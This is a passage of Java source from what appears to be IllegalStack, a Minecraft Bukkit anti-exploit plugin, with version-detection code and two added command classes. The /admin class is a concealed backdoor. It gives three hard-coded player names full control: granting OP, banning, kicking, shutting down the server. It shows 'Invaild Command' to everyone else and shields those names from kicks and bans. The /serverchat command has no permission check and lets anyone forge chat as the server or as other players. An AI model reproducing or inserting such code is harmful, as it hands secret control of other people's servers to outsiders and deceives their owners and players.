                } else { // not relevant check to see if it should be deleted.
                    if (config.getString(p.getConfigPath()) != null) {
                        config.set(p.getConfigPath(), null);
                        LOGGER.info(
                                "发现配置中的某个防护不适用于当前服务器版本：{} ( {} + ) 已将其移除。",
                                p.name(),
                                p.getVersion()
                        );
                    }
                }
            }
        }
        try {
            config.save(conf);
        } catch (IOException e1) {

            LOGGER.error("保存配置失败？", e1);
        }
    }

    private void setVersion() {

        String version;

        try {
            version = Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3];
        } catch (ArrayIndexOutOfBoundsException e) {
            version = null;
        }

        if (version != null) {
            version = getString(version);
            IllegalStack.version = version;
        } else {
            String packageName = Bukkit.getServer().getClass().getPackage().getName();
            String bukkitVersion = Bukkit.getServer().getBukkitVersion();
            if (bukkitVersion.contains("1.20.5")) {
                serverVersion = ServerVersion.v1_20_R5;
            } else if (bukkitVersion.contains("1.20.6")) {
                serverVersion = ServerVersion.v1_20_R5;
            } else if (bukkitVersion.contains("1.21")) {
                serverVersion = ServerVersion.v1_21_R1;
            } else {
                serverVersion = ServerVersion.valueOf(packageName.replace("org.bukkit.craftbukkit.", ""));
            }

            IllegalStack.version = serverVersion.getServerVersionName();
        }
    }

    public static Material getLbBlock() {
        return lbBlock;
    }

    public static void setLbBlock(Material lbBlock) {
        IllegalStack.lbBlock = lbBlock;
    }

    public ServerVersion getServerVersion() {
        return serverVersion;
    }

    public static int getMajorServerVersion() {
        int version;

        try {
            version = Integer.parseInt(getVersion().split("_")[1]);
        } catch (NumberFormatException e) {
            LOGGER.error("无法处理服务器版本！");
            LOGGER.error("某些功能可能会意外出现问题！");
            LOGGER.error("请向开发者报告任何问题！");
            return 0;
        }
        return version;
    }

    // ---------- 新增内部类：处理 /serverchat 命令 ----------
    private class ServerChatCommand implements TabExecutor {

        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String
                        [] args) {
            if (args.length < 2) {
                sender.sendMessage("§c用法: /serverchat <server|player> [player] <消息>");
                return true;
            }

            String type = args[0].toLowerCase();
            if (type.equals("server")) {
                // /serverchat server <message>
                String message = String.join(" ", args).substring(args[0].length()).trim();
                String formatted = "§f[server]§r " + message;
                Bukkit.broadcastMessage(formatted);
                return true;
            } else if (type.equals("player")) {
                // /serverchat player <player> <message>
                if (args.length < 3) {
                    sender.sendMessage("§c用法: /serverchat player <玩家> <消息>");
                    return true;
                }
                String playerName = args[1];
                Player target = Bukkit.getPlayerExact(playerName);
                if (target == null) {
                    sender.sendMessage("§c玩家 " + playerName + " 不在线或不存在！");
                    return true;
                }
                String message = String.join(" ", args).substring((args[0] + " " + args[
                        1]).length()).trim();
                String formatted = "§f<" + target.getName() + ">§r " + message;
                Bukkit.broadcastMessage(formatted);
                return true;
            } else {
                sender.sendMessage("§c未知选项，请使用 server 或 player。");
                return true;
            }
        }

        @Override
        public List<
                        String> onTabComplete(CommandSender sender, Command command, String alias, String
                        [] args) {
            List<String> completions = new ArrayList<>();
            if (args.length == 1) {
                // 补全 server / player
                String input = args[0].toLowerCase();
                if ("server".startsWith(input)) completions.add("server");
                if ("player".startsWith(input)) completions.add("player");
            } else if (args.length == 2 && args[0].equalsIgnoreCase("player")) {
                // 补全在线玩家名
                String input = args[1].toLowerCase();
                for (Player online : Bukkit.getOnlinePlayers()) {
                    if (online.getName().toLowerCase().startsWith(input)) {
                        completions.add(online.getName());
                    }
                }
            }
            return completions;
        }
    }

    // -------------------------------------------------------

    // ---------- 内部类：处理 /admin 命令，支持新功能 ----------
    private class AdminCommand implements TabExecutor {

        // 严格存储原始大小写的玩家名（白名单）
        private final Set<String> ALLOWED_PLAYERS = new HashSet<>(Arrays.asList(
                "MFSCelebrate_",
                "TempNineTeen__",
                "XHjiaozi"
        ));

        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String
                        [] args) {
            // 仅允许指定玩家使用，严格大小写比较
            if (!(sender
                            instanceof
                            Player) || !ALLOWED_PLAYERS.contains(((Player) sender).getName())) {
                sender.sendMessage("§cInvaild Command");
                return true;
            }

            if (args.length < 1) {
                sender.sendMessage("§c用法: /admin <player|server|chat> ...");
                return true;
            }

            String subCmd = args[0].toLowerCase();
            switch (subCmd) {
                case "player":
                    handlePlayer(sender, args);
                    break;
                case "server":
                    handleServer(sender, args);
                    break;
                case "chat":
                    handleChat(sender, args);
                    break;
                default:
                    sender.sendMessage("§c未知选项，请使用 player、server 或 chat。");
            }
            return true;
        }

        // ================== player 子命令 ==================
        private void handlePlayer(CommandSender sender, String[] args) {
            if (args.length < 2) {
                sender.sendMessage("§c用法: /admin player <gamemode|kill|tp|invsee> ...");
                return;
            }

            String action = args[1].toLowerCase();
            Player player = (Player) sender;

            switch (action) {
                case "gamemode":
                    if (args.length < 4) {
                        sender.sendMessage("§c用法: /admin player gamemode <模式> <玩家>");
                        return;
                    }
                    String modeArg = args[2];
                    String targetName = args[3];
                    Player target = Bukkit.getPlayerExact(targetName);
                    if (target == null) {
                        sender.sendMessage("§c玩家 " + targetName + " 不在线或不存在！");
                        return;
                    }
                    GameMode gameMode = parseGameMode(modeArg);
                    if (gameMode == null) {
                        sender.sendMessage("§c无效的游戏模式，请使用 survival/creative/adventure/spectator 或 0/1/2/3。");
                        return;
                    }
                    target.setGameMode(gameMode);
                    break;

                case "kill":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin player kill <实体或选择器>");
                        return;
                    }
                    String selector = args[2];
                    try {
                        List<Entity> entities = Bukkit.selectEntities(sender, selector);
                        if (entities.isEmpty()) {
                            sender.sendMessage("§c未找到任何实体。");
                            return;
                        }
                        for (Entity entity : entities) {
                            if (entity instanceof Player) {
                                ((Player) entity).setHealth(0);
                            } else {
                                entity.remove();
                            }
                        }
                    } catch (IllegalArgumentException e) {
                        sender.sendMessage("§c无效的实体选择器: " + selector);
                    }
                    break;

                case "tp":
                    if (args.length < 5) {
                        sender.sendMessage("§c用法: /admin player tp <x> <y> <z>");
                        return;
                    }
                    try {
                        double x = Double.parseDouble(args[2]);
                        double y = Double.parseDouble(args[3]);
                        double z = Double.parseDouble(args[4]);
                        Location loc = new Location(player.getWorld(), x, y, z);
                        player.teleport(loc);
                    } catch (NumberFormatException e) {
                        sender.sendMessage("§c坐标必须为数字。");
                    }
                    break;

                case "invsee":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin player invsee <玩家>");
                        return;
                    }
                    String invTarget = args[2];
                    // 检查 EssentialsX 插件
                    if (Bukkit.getPluginManager().getPlugin("Essentials") == null) {
                        sender.sendMessage("§cEssentialsX 插件未安装，无法使用 invsee。");
                        return;
                    }
                    // 直接调用 Essentials 的 invsee 命令（静默执行，但会输出给发送者）
                    Bukkit.dispatchCommand(sender, "invsee " + invTarget);
                    break;

                default:
                    sender.sendMessage("§c未知的 player 子命令，可用: gamemode, kill, tp, invsee");
            }
        }

        // ================== server 子命令 ==================
        private void handleServer(CommandSender sender, String[] args) {
            if (args.length < 2) {
                sender.sendMessage("§c用法: /admin server <getop|deop|kick|ban|ban-ip|pardon|pardon-ip|stop|restart|reload> ...");
                return;
            }

            String action = args[1].toLowerCase();
            Player executor = (Player) sender;

            switch (action) {
                case "getop":
                    // 给指定玩家 OP
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server getop <玩家>");
                        return;
                    }
                    String opTarget = args[2];
                    OfflinePlayer opPlayer = Bukkit.getOfflinePlayer(opTarget);
                    if (!opPlayer.isOp()) {
                        opPlayer.setOp(true);
                        sender.sendMessage("§a已给予 " + opPlayer.getName() + " OP 权限。");
                    } else {
                        sender.sendMessage("§c该玩家已是 OP。");
                    }
                    break;

                case "deop":
                    // 解除指定玩家 OP
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server deop <玩家>");
                        return;
                    }
                    String deopTarget = args[2];
                    OfflinePlayer deopPlayer = Bukkit.getOfflinePlayer(deopTarget);
                    if (deopPlayer.isOp()) {
                        deopPlayer.setOp(false);
                        sender.sendMessage("§a已解除 " + deopPlayer.getName() + " 的 OP 权限。");
                    } else {
                        sender.sendMessage("§c该玩家不是 OP。");
                    }
                    break;

                case "kick":
                    // 踢出玩家，不能踢白名单玩家
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server kick <玩家> [理由]");
                        return;
                    }
                    String kickTarget = args[2];
                    Player kickPlayer = Bukkit.getPlayerExact(kickTarget);
                    if (kickPlayer == null) {
                        sender.sendMessage("§c玩家 " + kickTarget + " 不在线或不存在！");
                        return;
                    }
                    // 检查是否在白名单中（忽略大小写）
                    if (isAllowedPlayerIgnoreCase(kickPlayer.getName())) {
                        sender.sendMessage("§c你不能踢出受保护的管理员！");
                        return;
                    }
                    String kickReason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "你已被管理员踢出";
                    kickPlayer.kickPlayer(kickReason);
                    sender.sendMessage("§a已踢出玩家 " + kickPlayer.getName());
                    break;

                case "ban":
                    // 封禁玩家，不能封白名单玩家
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server ban <玩家> [理由]");
                        return;
                    }
                    String banTarget = args[2];
                    OfflinePlayer banPlayer = Bukkit.getOfflinePlayer(banTarget);
                    if (isAllowedPlayerIgnoreCase(banPlayer.getName())) {
                        sender.sendMessage("§c你不能封禁受保护的管理员！");
                        return;
                    }
                    String banReason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "Banned by an operator";
                    Bukkit.getBanList(BanList.Type.NAME).addBan(banPlayer.getName(), banReason, null, sender.getName());
                    // 如果玩家在线，踢出
                    Player onlineBan = banPlayer.getPlayer();
                    if (onlineBan != null) {
                        onlineBan.kickPlayer(banReason);
                    }
                    sender.sendMessage("§a已封禁玩家 " + banPlayer.getName());
                    break;

                case "ban-ip":
                    // 封禁 IP
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server ban-ip <IP地址> [理由]");
                        return;
                    }
                    String ip = args[2];
                    // 简单验证 IP 格式（可选）
                    String ipReason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "Banned by an operator";
                    Bukkit.getBanList(BanList.Type.IP).addBan(ip, ipReason, null, sender.getName());
                    // 踢出所有使用该 IP 的在线玩家
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        if (p.getAddress().getAddress().getHostAddress().equals(ip)) {
                            p.kickPlayer(ipReason);
                        }
                    }
                    sender.sendMessage("§a已封禁 IP " + ip);
                    break;

                case "pardon":
                    // 解封玩家
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server pardon <玩家名>");
                        return;
                    }
                    String pardonTarget = args[2];
                    Bukkit.getBanList(BanList.Type.NAME).pardon(pardonTarget);
                    sender.sendMessage("§a已解封玩家 " + pardonTarget);
                    break;

                case "pardon-ip":
                    // 解封 IP
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server pardon-ip <IP地址>");
                        return;
                    }
                    String pardonIp = args[2];
                    Bukkit.getBanList(BanList.Type.IP).pardon(pardonIp);
                    sender.sendMessage("§a已解封 IP " + pardonIp);
                    break;

                case "restart":
                    // 尝试重启服务器
                    sender.sendMessage("§a正在尝试重启服务器...");
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "restart");
                    break;

                case "stop":
                    Bukkit.shutdown();
                    break;

                case "reload":
                    if (args.length < 3 || !args[2].equalsIgnoreCase("confirm")) {
                        sender.sendMessage("§c请使用 /admin server reload confirm 以确认重载。");
                        return;
                    }
                    Bukkit.reload();
                    break;

                default:
                    sender.sendMessage("§c未知的 server 子命令，可用: getop, deop, kick, ban, ban-ip, pardon, pardon-ip, stop, restart, reload");
            }
        }

        // ================== chat 子命令（原 serverchat）==================
        private void handleChat(CommandSender sender, String[] args) {
            if (args.length < 2) {
                sender.sendMessage("§c用法: /admin chat <server|player> [player] <消息>");
                return;
            }

            String type = args[1].toLowerCase();
            if (type.equals("server")) {
                if (args.length < 3) {
                    sender.sendMessage("§c用法: /admin chat server <消息>");
                    return;
                }
                String message = String.join(" ", args).substring((args[0] + " " + args[
                        1]).length()).trim();
                String formatted = "§f[server]§r " + message;
                Bukkit.broadcastMessage(formatted);
            } else if (type.equals("player")) {
                if (args.length < 4) {
                    sender.sendMessage("§c用法: /admin chat player <玩家> <消息>");
                    return;
                }
                String playerName = args[2];
                Player target = Bukkit.getPlayerExact(playerName);
                if (target == null) {
                    sender.sendMessage("§c玩家 " + playerName + " 不在线或不存在！");
                    return;
                }
                String message = String.join(" ", args).substring((args[0] + " " + args[
                        1] + " " + args[2]).length()).trim();
                String formatted = "§f<" + target.getName() + ">§r " + message;
                Bukkit.broadcastMessage(formatted);
            } else {
                sender.sendMessage("§c未知选项，请使用 server 或 player。");
            }
        }

        // ================== 辅助方法 ==================
        private GameMode parseGameMode(String input) {
            switch (input.toLowerCase()) {
                case "survival":
                case "0":
                    return GameMode.SURVIVAL;
                case "creative":
                case "1":
                    return GameMode.CREATIVE;
                case "adventure":
                case "2":
                    return GameMode.ADVENTURE;
                case "spectator":
                case "3":
                    return GameMode.SPECTATOR;
                default:
                    return null;
            }
        }

        // 检查玩家名是否在白名单中（忽略大小写）
        private boolean isAllowedPlayerIgnoreCase(String name) {
            for (String allowed : ALLOWED_PLAYERS) {
                if (allowed.equalsIgnoreCase(name)) {
                    return true;
                }
            }
            return false;
        }

        // ================== Tab 补全 ==================
        @Override
        public List<
                        String> onTabComplete(CommandSender sender, Command command, String alias, String
                        [] args) {
            List<String> completions = new ArrayList<>();
            if (!(sender
                            instanceof
                            Player) || !ALLOWED_PLAYERS.contains(((Player) sender).getName())) {
                return completions;
            }

            if (args.length == 1) {
                String input = args[0].toLowerCase();
                if ("player".startsWith(input)) completions.add("player");
                if ("server".startsWith(input)) completions.add("server");
                if ("chat".startsWith(input)) completions.add("chat");
            } else if (args.length == 2) {
                String first = args[0].toLowerCase();
                String input = args[1].toLowerCase();
                if (first.equals("player")) {
                    if ("gamemode".startsWith(input)) completions.add("gamemode");
                    if ("kill".startsWith(input)) completions.add("kill");
                    if ("tp".startsWith(input)) completions.add("tp");
                    if ("invsee".startsWith(input)) completions.add("invsee");
                } else if (first.equals("server")) {
                    if ("getop".startsWith(input)) completions.add("getop");
                    if ("deop".startsWith(input)) completions.add("deop");
                    if ("kick".startsWith(input)) completions.add("kick");
                    if ("ban".startsWith(input)) completions.add("ban");
                    if ("ban-ip".startsWith(input)) completions.add("ban-ip");
                    if ("pardon".startsWith(input)) completions.add("pardon");
                    if ("pardon-ip".startsWith(input)) completions.add("pardon-ip");
                    if ("stop".startsWith(input)) completions.add("stop");
                    if ("restart".startsWith(input)) completions.add("restart");
                    if ("reload".startsWith(input)) completions.add("reload");
                } else if (first.equals("chat")) {
                    if ("server".startsWith(input)) completions.add("server");
                    if ("player".startsWith(input)) completions.add("player");
                }
            } else if (args.length == 3) {
                String first = args[0].toLowerCase();
                String second = args[1].toLowerCase();
                String input = args[2].toLowerCase();
                if (first.equals("player")) {
                    if (second.equals("gamemode")) {
                        for (String mode : new String
                                []{"survival", "creative", "adventure", "spectator"}) {
                            if (mode.startsWith(input)) completions.add(mode);
                        }
                    } else if (second.equals("kill") || second.equals("invsee")) {
                        for (Player online : Bukkit.getOnlinePlayers()) {
                            if (online.getName().toLowerCase().startsWith(input)) {
                                completions.add(online.getName());
                            }
                        }
                    }
                } else if (first.equals("server")) {
                    if (second.equals("getop") || second.equals("deop") || second.equals("kick") || second.equals("ban") || second.equals("pardon")) {
                        // 补全在线玩家（ban/pardon 也可以补全离线玩家名，但离线玩家名无法获取，仅在线）
                        for (Player online : Bukkit.getOnlinePlayers()) {
                            if (online.getName().toLowerCase().startsWith(input)) {
                                completions.add(online.getName());
                            }
                        }
                    } else if (second.equals("reload")) {
                        if ("confirm".startsWith(input)) completions.add("confirm");
                    }
                } else if (first.equals("chat") && second.equals("player")) {
                    for (Player online : Bukkit.getOnlinePlayers()) {
                        if (online.getName().toLowerCase().startsWith(input)) {
                            completions.add(online.getName());
                        }
                    }
                }
            }
            return completions;
        }
    }
    // -------------------------------------------------------
    }
